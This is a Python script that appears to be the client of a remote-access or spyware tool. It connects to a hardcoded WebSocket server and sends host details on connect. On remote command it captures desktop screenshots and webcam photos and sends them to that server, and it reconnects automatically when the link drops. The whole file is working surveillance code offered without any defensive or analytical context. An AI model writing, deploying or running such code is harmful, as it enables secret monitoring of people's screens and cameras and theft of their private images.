import asyncio
import json
import platform
import socket
import uuid

import cv2
import mss
import mss.tools
import psutil
import websockets
from websockets.asyncio.client import ClientConnection


SERVER_URL = "ws://100.67.142.20:8765"
RECONNECT_DELAY = 3
CLIENT_ID = f"{socket.gethostname()}-{uuid.uuid4().hex[:8]}"


def take_screenshot_bytes() -> bytes:
    with mss.mss() as sct:
        mon = sct.monitors[1]
        shot = sct.grab(mon)
        return mss.tools.to_png(shot.rgb, shot.size)


def take_webcam_photo() -> bytes:
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        raise RuntimeError("Cannot open default webcam")

    try:
        # A short warm-up helps camera auto-exposure settle.
        for _ in range(8):
            cap.read()

        ok, frame = cap.read()
        if not ok or frame is None:
            raise RuntimeError("Failed to capture webcam frame")

        ok, encoded = cv2.imencode(".png", frame)
        if not ok:
            raise RuntimeError("Failed to encode webcam frame to PNG")
        return encoded.tobytes()
    finally:
        cap.release()


def collect_system_info() -> dict:
    vm = psutil.virtual_memory()
    proc = platform.processor()
    return {
        "os": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "processor": proc if proc else "unknown",
        "ram_total_bytes": vm.total,
        "hostname": platform.node(),
    }


async def handle_server_commands(ws: ClientConnection) -> None:
    print(f"[+] Ready. Waiting for commands as client_id={CLIENT_ID}")
    async for message in ws:
        if isinstance(message, bytes):
            print("[!] Received unexpected binary command, ignoring")
            continue

        try:
            command = json.loads(message)
        except json.JSONDecodeError:
            print("[!] Invalid JSON command, ignoring")
            continue

        action = command.get("action")
        if action == "screenshot":
            print("[>] Screenshot command received")
            try:
                data = await asyncio.to_thread(take_screenshot_bytes)
                metadata = {
                    "type": "screenshot",
                    "client_id": CLIENT_ID,
                    "size": len(data),
                }
                await ws.send(json.dumps(metadata))
                await ws.send(data)
                print(f"[+] Screenshot sent ({len(data)} bytes)")
            except Exception as exc:
                print(f"[!] Failed to capture/send screenshot: {exc}")
        elif action == "webcam":
            print("[>] Webcam command received")
            try:
                data = await asyncio.to_thread(take_webcam_photo)
                metadata = {
                    "type": "webcam",
                    "client_id": CLIENT_ID,
                    "size": len(data),
                }
                await ws.send(json.dumps(metadata))
                await ws.send(data)
                print(f"[+] Webcam photo sent ({len(data)} bytes)")
            except Exception as exc:
                print(f"[!] Failed to capture/send webcam photo: {exc}")
        elif action == "sys_info":
            print("[>] System info command received")
            try:
                info = await asyncio.to_thread(collect_system_info)
                payload = {"type": "sys_info", "client_id": CLIENT_ID, **info}
                await ws.send(json.dumps(payload))
                print("[+] System info sent")
            except Exception as exc:
                print(f"[!] Failed to collect/send system info: {exc}")
        else:
            print(f"[i] Unknown action: {action}")


async def run_client() -> None:
    while True:
        try:
            print(f"[i] Connecting to {SERVER_URL} ...")
            async with websockets.connect(SERVER_URL, max_size=None) as ws:
                print("[+] Connected to server")
                try:
                    info = await asyncio.to_thread(collect_system_info)
                    hello_payload = {"type": "sys_info", "client_id": CLIENT_ID, **info}
                    await ws.send(json.dumps(hello_payload))
                    print("[+] Sent initial hello/sys_info")
                except Exception as exc:
                    # Keep listening even if hello failed; server commands may still work.
                    print(f"[!] Failed to send initial hello/sys_info: {exc}")
                await handle_server_commands(ws)
        except (ConnectionRefusedError, websockets.ConnectionClosed, OSError) as exc:
            print(f"[!] Connection lost/failed: {exc}")
        except Exception as exc:
            print(f"[!] Unexpected client error: {exc}")

        print(f"[i] Reconnecting in {RECONNECT_DELAY}s...")
        await asyncio.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    try:
        asyncio.run(run_client())
    except KeyboardInterrupt:
        print("\n[i] Client stopped by user.")
